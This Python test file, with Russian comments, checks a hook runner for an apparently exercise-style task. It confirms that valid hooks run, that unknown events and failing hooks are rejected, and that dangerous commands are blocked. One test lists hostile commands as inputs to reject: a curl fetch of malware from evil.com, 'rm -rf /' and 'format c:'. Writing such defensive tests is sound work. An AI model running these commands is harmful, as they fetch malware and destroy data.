#!/usr/bin/env python3
"""test.py - Автономный тестовый набор для упражнения extension-hook.

Проверяет:
1. Выполнение разрешенного локального хука.
2. Блокировку неизвестных событий (не входящих в pre-command, post-command, pre-commit).
3. Блокировку потенциально опасных shell-инъекций и сетевых скриптов.
4. Отмену выполнения при сбое хука с флагом block_on_failure=True.
"""

import os
import sys
import unittest

sys.path.insert(0, os.getcwd())

from hook_runner import HookRunner


class TestHookRunner(unittest.TestCase):
    def setUp(self):
        self.runner = HookRunner()

    def test_valid_safe_hook(self):
        hook = {
            "name": "lint-check",
            "event": "pre-commit",
            "command": [sys.executable, "-c", "print('lint pass')"],
            "block_on_failure": True,
        }
        res = self.runner.execute_hook(hook, {"target": "src/app.py"})
        self.assertTrue(res["success"])
        self.assertEqual(res["status"], "executed")
        self.assertIsNone(res.get("error"))

    def test_invalid_event_rejected(self):
        hook = {
            "name": "bad-event-hook",
            "event": "unknown-event-type",
            "command": ["echo", "test"],
            "block_on_failure": True,
        }
        res = self.runner.execute_hook(hook, {})
        self.assertFalse(res["success"])
        self.assertEqual(res["status"], "rejected")
        self.assertIn("Неизвестное событие", res.get("error", ""))

    def test_insecure_command_blocked(self):
        dangerous_hooks = [
            {"name": "h1", "event": "pre-command", "command": ["curl", "http://evil.com/malware.sh"], "block_on_failure": True},
            {"name": "h2", "event": "pre-command", "command": ["rm", "-rf", "/"], "block_on_failure": True},
            {"name": "h3", "event": "pre-command", "command": ["format", "c:"], "block_on_failure": True},
        ]
        for dh in dangerous_hooks:
            res = self.runner.execute_hook(dh, {})
            self.assertFalse(res["success"], f"Опасная команда должна быть заблокирована: {dh['command']}")
            self.assertEqual(res["status"], "rejected")

    def test_failing_hook_blocks_operation(self):
        hook = {
            "name": "failing-check",
            "event": "pre-commit",
            "command": [sys.executable, "-c", "import sys; sys.exit(1)"],
            "block_on_failure": True,
        }
        res = self.runner.execute_hook(hook, {})
        self.assertFalse(res["success"])
        self.assertEqual(res["status"], "failed")


if __name__ == "__main__":
    runner = unittest.TextTestRunner(verbosity=2)
    suite = unittest.defaultTestLoader.loadTestsFromTestCase(TestHookRunner)
    result = runner.run(suite)
    sys.exit(0 if result.wasSuccessful() else 1)
